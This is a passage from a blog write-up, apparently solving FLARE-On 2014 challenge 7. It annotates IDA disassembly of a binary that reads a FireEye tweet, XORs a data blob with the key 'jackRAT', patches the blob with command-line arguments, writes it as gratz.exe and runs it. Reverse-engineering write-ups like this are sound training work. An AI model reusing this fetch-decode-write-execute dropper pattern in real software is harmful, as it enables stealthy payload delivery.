</span><span class='line'><span class="nl">.text:</span><span class="err">00401946</span> <span class="nf">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">4</span><span class="nv">C</span><span class="p">],</span> <span class="mh">790045h</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">0040194</span><span class="nf">D</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">48</span><span class="p">],</span> <span class="mh">2F0065h</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401954</span> <span class="nf">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">44</span><span class="p">],</span> <span class="mh">740073h</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">0040195</span><span class="nf">B</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">40</span><span class="p">],</span> <span class="mh">740061h</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401962</span> <span class="nf">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">3</span><span class="nv">C</span><span class="p">],</span> <span class="mh">730075h</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401969</span> <span class="nf">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">38</span><span class="p">],</span> <span class="mh">34002Fh</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401970</span> <span class="nf">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">34</span><span class="p">],</span> <span class="mh">340038h</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401977</span> <span class="nf">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">30</span><span class="p">],</span> <span class="mh">330030h</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">0040197</span><span class="nf">E</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">2</span><span class="nv">C</span><span class="p">],</span> <span class="mh">350033h</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401985</span> <span class="nf">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">28</span><span class="p">],</span> <span class="mh">350031h</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">0040198</span><span class="nf">C</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">24</span><span class="p">],</span> <span class="mh">330035h</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401993</span> <span class="nf">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">20</span><span class="p">],</span> <span class="mh">310038h</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">0040199</span><span class="nf">A</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">1</span><span class="nv">C</span><span class="p">],</span> <span class="mh">360031h</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">004019</span><span class="nf">A1</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">18</span><span class="p">],</span> <span class="mh">300036h</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">004019</span><span class="nf">A8</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">14</span><span class="p">],</span> <span class="mh">38h</span>   <span class="c1">; https://twitter.com/FireEye/status/484033515538116608</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">004019</span><span class="nf">AF</span> <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">InternetOpenUrlW</span> <span class="c1">; open URL</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">004019</span><span class="nf">B5</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">hInternet</span><span class="p">],</span> <span class="nb">eax</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">004019</span><span class="nf">BB</span> <span class="nv">cmp</span>     <span class="nb">eax</span><span class="p">,</span> <span class="nb">ebx</span>        <span class="c1">; ebx == 0x00 - check if eax is zero</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">004019</span><span class="nf">BD</span> <span class="nv">jz</span>      <span class="nv">loc</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">4018</span><span class="nv">D4</span>      <span class="c1">; if (eax == 0 ) jump to loc_4018D4 (return immedi</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p><a href="http://msdn.microsoft.com/en-us/library/windows/desktop/aa385098%28v=vs.85%29.aspx">InternetOpenUrl</a> opens a handle to a resource. <code>dwFlags</code> is set to <code>0x00400100</code>. I could not find the exact meaning of this flag value. However, according to <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/aa383661%28v=vs.85%29.aspx">this page</a> it could be the <code>OR</code> of two flags (does it work that way?):</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>0x00400100 flag </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>INTERNET_FLAG_KEEP_CONNECTION: 0x00400000
</span><span class='line'>Uses keep-alive semantics, if available, for the connection.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>INTERNET_FLAG_PRAGMA_NOCACHE: 0x00000100
</span><span class='line'>Forces the request to be resolved by the origin server.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>Lines 9 to 35 are saving the URL, we know what it is without even looking at it. We have seen it in Wireshark before. The URL is <code>https://twitter.com/FireEye/status/484033515538116608</code>.</p>

<p><img src="/images/2014/flare/7-2.jpg" alt="Fireeye tweet" title="Fireeye tweet" /></p>

<p>Line 37 saves return value which is a “valid handle to the URL if the connection is successfully established, or NULL if the connection fails”. Then it is checked for being NULL, if so we will jump to <code>loc_4018D4</code> and function returns immediately. If we have a handle to the tweet, execution continues.</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>loc 4019D6 - InternetReadFile </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class='nasm'><span class='line'><span class="nl">.text:</span><span class="err">004019</span><span class="nf">D6</span> <span class="nv">loc</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">4019</span><span class="nv">D6</span><span class="p">:</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">004019</span><span class="nf">D6</span> <span class="nv">lea</span>     <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">dwNumberOfBytesRead</span><span class="p">]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">004019</span><span class="nf">DC</span> <span class="nv">push</span>    <span class="nb">edx</span>             <span class="c1">; lpdwNumberOfBytesRead - Pointer to variable that will hold number of bytes read</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">004019</span><span class="kd">DD</span> <span class="nv">push</span>    <span class="mh">1000h</span>           <span class="c1">; dwNumberOfBytesToRead - Number of bytes to read 0x1000 == 4096</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">004019</span><span class="nf">E2</span> <span class="nv">lea</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">Buffer</span><span class="p">]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">004019</span><span class="nf">E8</span> <span class="nv">push</span>    <span class="nb">ecx</span>             <span class="c1">; lpBuffer - Buffer to hold the retrieved data</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">004019</span><span class="nf">E9</span> <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; hFile - Handle from previous InternetOpenUrl call</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">004019</span><span class="nf">EA</span> <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">InternetReadFile</span> <span class="c1">; Reading the first 4KBs of the tweet</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">004019</span><span class="nf">F0</span> <span class="nv">mov</span>     <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">dwNumberOfBytesRead</span><span class="p">]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">004019</span><span class="nf">F6</span> <span class="nv">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">edi</span><span class="o">+</span><span class="nb">edx</span><span class="p">]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">004019</span><span class="nf">F9</span> <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; size_t</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">004019</span><span class="nf">FA</span> <span class="nv">call</span>    <span class="nv">??2@YAPAXI@Z</span>    <span class="c1">; operator new(uint)</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">004019</span><span class="nf">FF</span> <span class="nv">push</span>    <span class="nb">edi</span>             <span class="c1">; size_t</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">A00</span> <span class="nv">mov</span>     <span class="nb">esi</span><span class="p">,</span> <span class="nb">eax</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">A02</span> <span class="nv">push</span>    <span class="nb">ebx</span>             <span class="c1">; void *</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">A03</span> <span class="nv">push</span>    <span class="nb">esi</span>             <span class="c1">; void *</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">A04</span> <span class="nv">call</span>    <span class="nv">_memcpy</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">A09</span> <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">dwNumberOfBytesRead</span><span class="p">]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">A0F</span> <span class="nv">push</span>    <span class="nb">ecx</span>             <span class="c1">; size_t</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">A10</span> <span class="nv">lea</span>     <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">Buffer</span><span class="p">]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">A16</span> <span class="nv">push</span>    <span class="nb">edx</span>             <span class="c1">; void *</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">A17</span> <span class="nv">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="o">+</span><span class="nb">edi</span><span class="p">]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">A1A</span> <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; void *</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">A1B</span> <span class="nv">call</span>    <span class="nv">_memcpy</span>         <span class="c1">; Copy retrieved data to [eax]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">A20</span> <span class="nv">push</span>    <span class="nb">ebx</span>             <span class="c1">; void *</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">A21</span> <span class="nv">call</span>    <span class="nv">??3@YAXPAX@Z</span>    <span class="c1">; operator delete(void *)</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">A26</span> <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">dwNumberOfBytesRead</span><span class="p">]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">A2C</span> <span class="nv">add</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mh">20h</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">A2F</span> <span class="nv">add</span>     <span class="nb">edi</span><span class="p">,</span> <span class="nb">eax</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">A31</span> <span class="nv">mov</span>     <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esi</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">A33</span> <span class="nv">test</span>    <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>         <span class="c1">; Keep reading until NumberofBytesRead is zero</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">A35</span> <span class="nv">jnz</span>     <span class="nv">short</span> <span class="nv">loc</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">4019</span><span class="nv">D0</span> <span class="c1">; if (NumberofBytesRead !=0 ) jump to loc_4019D0 to continue reading&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="err">&lt;</span><span class="nf">p</span><span class="o">&gt;</span><span class="nv">.text</span><span class="p">:</span><span class="mi">004019</span><span class="nv">D0</span> <span class="nv">loc_4019D0</span><span class="p">:</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">004019</span><span class="nf">D0</span> <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">hInternet</span><span class="p">]</span> <span class="c1">; Back to the top to continue reading</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p><a href="http://msdn.microsoft.com/en-us/library/windows/desktop/aa385103%28v=vs.85%29.aspx">InternetReadFile</a> retrieves the tweet. A buffer is created to hold the retrieved data. Documentation says “[a] normal read retrieves the specified dwNumberOfBytesToRead for each call to InternetReadFile until the end of the file is reached. To ensure all data is retrieved, an application must continue to call the InternetReadFile function until the function returns TRUE and the lpdwNumberOfBytesRead parameter equals zero.” This is happening in lines 31-35. We keep reading until <code>NumberofBytesRead</code> is zero.</p>

<p>After we are done, the jump in line 32 is not taken and we land here:</p>

<p><img src="/images/2014/flare/7-21.jpg" alt="Sifting through the tweet" title="Sifting through the tweet" /></p>

<p>We retrieved the tweet. Now <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/bb773436%28v=vs.85%29.aspx">strstr</a> is called to find the first instance of <code>Secluded Hi</code> in the tweet. The return value is a pointer to the start of <code>Secluded HijackRAT http://t.co/ckx18JHdkb ...</code>. The application adds <code>0x0B</code> or 11 to the start of the string to skip <code>Secluded Hi</code> and point to <code>jackRAT http://t.co/ckx18JHdkb ...</code>. A new 8 character buffer is created and passed to <a href="http://msdn.microsoft.com/en-us/library/xdsywd25.aspx">strncpy</a>. <code>strncpy</code> is called to copy 7 bytes from the start to the newly created buffer which will be <code>jackRAT</code>. The rest is simple, <code>jackRAT</code> is xor-ed with the blob and finally <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/aa384350%28v=vs.85%29.aspx">InternetCloseHandle</a> is called three times to close the three function calls.</p>

<p><img src="/images/2014/flare/7-22.jpg" alt="xor(blob,&quot;jackRAT&quot;)" title="xor(blob,&quot;jackRAT" /></p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>jackRAT xor </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">blob</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span><span class="err">”</span><span class="n">jackRAT</span><span class="err">”</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<h3 id="are-we-there-yet-gratz-but-not-yet">Are we there yet? gratz but not yet</h3>

<p><div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
</pre></td><td class='code'><pre><code class='nasm'><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B83</span> <span class="nv">loc</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">401</span><span class="nv">B83</span><span class="p">:</span>                             <span class="c1">; CODE XREF: .text:00401B58j</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B83</span> <span class="nv">call</span>    <span class="nv">InternetRootz</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B88</span> <span class="nv">call</span>    <span class="nv">jackRAT</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B8D</span> <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="o">+</span><span class="mi">4</span><span class="p">]</span>          <span class="c1">; you are here</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B90</span> <span class="nv">movzx</span>   <span class="nb">edx</span><span class="p">,</span> <span class="kt">byte</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">ecx</span><span class="p">]</span>   <span class="c1">; application crashes here if no arguments are provided</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B93</span> <span class="nv">mov</span>     <span class="nb">bl</span><span class="nv">ob</span><span class="p">,</span> <span class="nb">dl</span>              <span class="c1">; blob[0] = arg1[0]; first character of arg1 written to blob</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B99</span> <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="o">+</span><span class="mi">4</span><span class="p">]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B9C</span> <span class="nv">mov</span>     <span class="nb">cl</span><span class="p">,</span> <span class="p">[</span><span class="nb">eax</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span>           <span class="c1">; cl = arg1[1]; second character of arg1</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B9F</span> <span class="nv">mov</span>     <span class="kt">byte</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">4131</span><span class="nv">F9</span><span class="p">,</span> <span class="nb">cl</span>       <span class="c1">; blob[1] = arg1[1];</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BA5</span> <span class="nv">mov</span>     <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="o">+</span><span class="mi">8</span><span class="p">]</span>          <span class="c1">; edx = *(arg2);</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BA8</span> <span class="nv">mov</span>     <span class="nb">al</span><span class="p">,</span> <span class="p">[</span><span class="nb">edx</span><span class="p">]</span>             <span class="c1">; al = arg2[0];</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BAA</span> <span class="nv">mov</span>     <span class="kt">byte</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">413278</span><span class="p">,</span> <span class="nb">al</span>       <span class="c1">; blob[0x80] = arg2[0]; 413278 - 413F9 = 0x7F</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BAF</span> <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="o">+</span><span class="mi">8</span><span class="p">]</span>          <span class="c1">; ecx = *(arg2);</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BB2</span> <span class="nv">movzx</span>   <span class="nb">edx</span><span class="p">,</span> <span class="kt">byte</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">ecx</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="c1">; edx = arg2[1];</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BB6</span> <span class="nv">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">10h</span><span class="p">]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BB9</span> <span class="nv">push</span>    <span class="nv">offset</span> <span class="nv">aWb</span>            <span class="c1">; mode: “wb” - write in binary mode</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BBE</span> <span class="nv">push</span>    <span class="nb">eax</span>                   <span class="c1">; push current path</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BBF</span> <span class="nv">mov</span>     <span class="kt">byte</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">413279</span><span class="p">,</span> <span class="nb">dl</span>       <span class="c1">; blob[0x81] = arg2[1];</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BC5</span> <span class="nv">mov</span>     <span class="kt">dword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">10h</span><span class="p">],</span> <span class="mh">74617267h</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BCC</span> <span class="nv">mov</span>     <span class="kt">dword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0Ch</span><span class="p">],</span> <span class="mh">78652E7Ah</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BD3</span> <span class="nv">mov</span>     <span class="kt">word</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mi">8</span><span class="p">],</span> <span class="mh">65h</span> <span class="c1">; “gratz.exe” saved in [ebp-10]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BD9</span> <span class="nv">call</span>    <span class="nv">_fopen</span>                <span class="c1">; fopen(filename=”currentpath\gratz.exe”,mode=”wb”); Open if exists and if not create it&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="err">&lt;</span><span class="nf">p</span><span class="o">&gt;</span><span class="nv">.text</span><span class="p">:</span><span class="mi">00401</span><span class="nv">BDE</span> <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="nb">bl</span><span class="nv">ob_length</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BE4</span> <span class="nv">mov</span>     <span class="nb">esi</span><span class="p">,</span> <span class="nb">eax</span>              <span class="c1">; *(gratz.exe)</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BE6</span> <span class="nv">push</span>    <span class="nb">esi</span>                   <span class="c1">; FILE = *(gratz.exe)</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BE7</span> <span class="nv">push</span>    <span class="nb">ecx</span>                   <span class="c1">; size = blob length</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BE8</span> <span class="nv">push</span>    <span class="mi">1</span>                     <span class="c1">; count = 1</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BEA</span> <span class="nv">push</span>    <span class="nv">offset</span> <span class="nb">bl</span><span class="nv">ob</span>           <span class="c1">; buffer = *(blob)</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BEF</span> <span class="nv">call</span>    <span class="nv">_fwrite</span>               <span class="c1">; fwrite( *(blob), 1, blob_length, *(gratz.exe) ); Write blob to gratz.exe&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="err">&lt;</span><span class="nf">p</span><span class="o">&gt;</span><span class="nv">.text</span><span class="p">:</span><span class="mi">00401</span><span class="nv">BF4</span> <span class="nv">push</span>    <span class="nb">esi</span>                   <span class="c1">; push *(gratz.exe)</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BF5</span> <span class="nv">call</span>    <span class="nv">_fclose</span>               <span class="c1">; fclose( *(gratz.exe) ); Close gratz.exe&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="err">&lt;</span><span class="nf">p</span><span class="o">&gt;</span><span class="nv">.text</span><span class="p">:</span><span class="mi">00401</span><span class="nv">BFA</span> <span class="nv">lea</span>     <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">10h</span><span class="p">]</span>        <span class="c1">; edx = “gratz.exe”</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BFD</span> <span class="nv">push</span>    <span class="nb">edx</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BFE</span> <span class="nv">call</span>    <span class="nv">_system</span>               <span class="c1">; system(“gratz.exe”); Execute gratz.exe</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">C03</span> <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span><span class="o">&lt;/</span><span class="nv">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="err">&lt;</span><span class="nf">p</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>The application crashed in line 5 over and over again. When I looked inside ecx I saw empty space but looking around I saw the application’s complete path. After a while I realized that the code is trying to read arguments. The rest is obvious from the code. First two characters of first argument are written over the first two characters of the blob. First and second characters of second argument are written at offset <code>0x80</code> and <code>0x81</code>.</p>

